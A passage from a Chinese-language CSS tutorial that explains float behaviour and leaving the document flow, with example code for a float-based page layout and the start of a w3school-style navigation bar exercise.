class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>浮动元素向左或向右移动时，不会超过前边的浮动元素（先来后到的顺序）<br><img data-src="https://s3.bmp.ovh/imgs/2022/01/3c37dbd304afd099.png" alt=""></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box1</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: orange;</span></span><br><span class="line"><span class="css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box2</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box3</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: yellow;</span></span><br><span class="line"><span class="css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>浮动元素不会超过上边的浮动的兄弟元素，最多就是和它一样高<br><img data-src="https://s3.bmp.ovh/imgs/2022/01/208164b48726de55.gif" alt=""></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box1</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: orange;</span></span><br><span class="line"><span class="css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box2</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box3</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: yellow;</span></span><br><span class="line"><span class="css">        <span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>如果浮动元素的上边是一个没有浮动的块元素，则浮动元素无法上移<br><img data-src="https://s3.bmp.ovh/imgs/2022/01/3e2c329efbb4bb59.png" alt=""></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box1</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: orange;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box2</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>浮动元素不会盖住文字，文字会自动环绕在浮动元素的周围，所以我们可以利用浮动来设置文字环绕图片的效果<br><img data-src="https://s3.bmp.ovh/imgs/2022/01/76f947a83dcadaea.png" alt=""></li></ol><p>简单总结：</p><ul><li><p>浮动目前来讲它的主要作用就是让页面中的元素可以水平排列，通过浮动可以制作一些水平方向的布局</p></li><li><p>元素设置浮动以后，将会从文档流中脱离，从文档流中脱离后，元素的一些特点也会发生变化</p></li></ul><h2 id="3-脱离文档流的特点"><a class="markdownIt-Anchor" href="#3-脱离文档流的特点">#</a> 3. 脱离文档流的特点</h2><p>块元素：</p><ul><li><p>块元素不再独占页面的一行</p></li><li><p>脱离文档流以后，块元素的宽度和高度默认都被内容撑开</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box1</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: orange;</span></span><br><span class="line"><span class="css">        <span class="comment">/* float: left; */</span></span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/b29577b94d264b0c.gif" alt=""></p><p>行内元素：</p><ul><li>行内元素脱离文档流以后会，特点和块元素一样</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">span</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: orange;</span></span><br><span class="line"><span class="css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>I am a Span<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210524204755.gif" alt="img"></p><p>脱离文档流之后的特点很像行内块元素，不过存在一些差异</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">span</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: orange;</span></span><br><span class="line"><span class="css">        <span class="comment">/* display: inline-block; */</span></span></span><br><span class="line"><span class="css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>I am a Span<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>I am a Span<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210524205402.gif" alt="img"></p><h2 id="4-简单布局"><a class="markdownIt-Anchor" href="#4-简单布局">#</a> 4. 简单布局</h2><p><strong>整体样式</strong></p><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210524222204.png" alt="img"></p><p><strong>目的</strong></p><ol><li><p>熟悉布局（块元素、浮动）</p></li><li><p>公共 css 部分复用</p></li><li><p>复习语义标签</p></li></ol><p><strong>代码</strong></p><p>html 代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 页眉 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 主体 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 左边栏 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 中心 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">article</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 内容上 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 内容下 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bottom&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 内容左 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 内容中 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;middle&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 内容右 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 右边栏 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aside</span>&gt;</span><span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 页脚 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css 代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 公共部分 */</span></span><br><span class="line"><span class="selector-tag">header</span>,</span><br><span class="line"><span class="selector-tag">main</span>,</span><br><span class="line"><span class="selector-tag">footer</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">1000px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">main</span> <span class="selector-tag">nav</span>,</span><br><span class="line"><span class="selector-tag">main</span> <span class="selector-tag">article</span>,</span><br><span class="line"><span class="selector-tag">main</span> <span class="selector-tag">aside</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="comment">/* 虽然设置浮动了，但整体大小是被内容撑开的，所以设置一个高度 */</span></span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.bottom</span> <span class="selector-class">.left</span>,</span><br><span class="line"><span class="selector-class">.bottom</span> <span class="selector-class">.middle</span>,</span><br><span class="line"><span class="selector-class">.bottom</span> <span class="selector-class">.right</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">220px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ==========整体布局-上========== */</span></span><br><span class="line"><span class="selector-tag">header</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: silver;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ==========整体布局-中========== */</span></span><br><span class="line"><span class="selector-tag">main</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------左边栏------ */</span></span><br><span class="line"><span class="selector-tag">main</span> <span class="selector-tag">nav</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">150px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------中心------ */</span></span><br><span class="line"><span class="selector-tag">main</span> <span class="selector-tag">article</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">680px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: green;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---上--- */</span></span><br><span class="line"><span class="selector-tag">article</span> <span class="selector-class">.top</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">190px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---下--- */</span></span><br><span class="line"><span class="selector-tag">article</span> <span class="selector-class">.bottom</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: orange;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 左 */</span></span><br><span class="line"><span class="selector-class">.bottom</span> <span class="selector-class">.left</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: lightblue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 中 */</span></span><br><span class="line"><span class="selector-class">.bottom</span> <span class="selector-class">.middle</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: gray;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 右 */</span></span><br><span class="line"><span class="selector-class">.bottom</span> <span class="selector-class">.right</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: wheat;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------右边栏------ */</span></span><br><span class="line"><span class="selector-tag">main</span> <span class="selector-tag">aside</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">150px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ==========整体布局-下========== */</span></span><br><span class="line"><span class="selector-tag">footer</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: tomato;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210524230840.png" alt="img"></p><h2 id="5-练习w3school导航条"><a class="markdownIt-Anchor" href="#5-练习w3school导航条">#</a> 5. 练习：w3school 导航条</h2><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210524215420.png" alt="img"></p><p>去除默认样式，引入 reset.css</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/reset.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css 样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 去除默认样式 */</span></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ul整体布局 */</span></span><br><span class="line"><span class="selector-class">.menu</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">1211px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">48px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#E8E7E3</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* li整体布局 */</span></span><br><span class="line"><span class="selector-class">.nav</span> &#123;</span><br><span class="line">    <span class="comment">/* 浮动li元素 */</span></span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">173px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">48px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="comment">/* 注意点：升级为块元素，使之继承父类宽高</span></span><br><span class="line"><span class="comment">    否则鼠标悬浮在li元素上时，鼠标“箭头”不会进入a元素变成“小手” */</span></span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="comment">/* 内容水平居中 */</span></span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="comment">/* 字体样式 */</span></span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#777777</span>;</span><br><span class="line">    <span class="attribute">font-family</span>: Verdana, Arial, <span class="string">&#x27;微软雅黑&#x27;</span>, <span class="string">&#x27;宋体&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 超链接悬浮效果 */</span></span><br><span class="line"><span class="selector-class">.nav</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#3F3F3F</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#E8E7E3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>html 代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;menu&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>HTML/CSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Browser Side<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Server Side<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Programming<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span 